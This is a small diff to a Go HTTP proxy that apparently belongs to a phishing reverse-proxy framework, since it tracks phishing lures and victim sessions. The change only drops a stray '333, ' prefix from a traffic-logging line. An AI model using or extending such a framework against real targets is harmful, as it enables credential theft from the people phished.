@@ -329,7 +329,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				if ps.SessionId != "" {
-					LogIncomingReq(req, &p.cfg.trafficloggers, "333, Lure "+p.sessions[ps.SessionId].PhishLure.Path+", Session "+p.sessions[ps.SessionId].Id) //send to trafficlogger
+					LogIncomingReq(req, &p.cfg.trafficloggers, "Lure "+p.sessions[ps.SessionId].PhishLure.Path+", Session "+p.sessions[ps.SessionId].Id) //send to trafficlogger
 					if s, ok := p.sessions[ps.SessionId]; ok {
 						l, err := p.cfg.GetLureByPath(pl_name, req_path)
 						if err == nil {
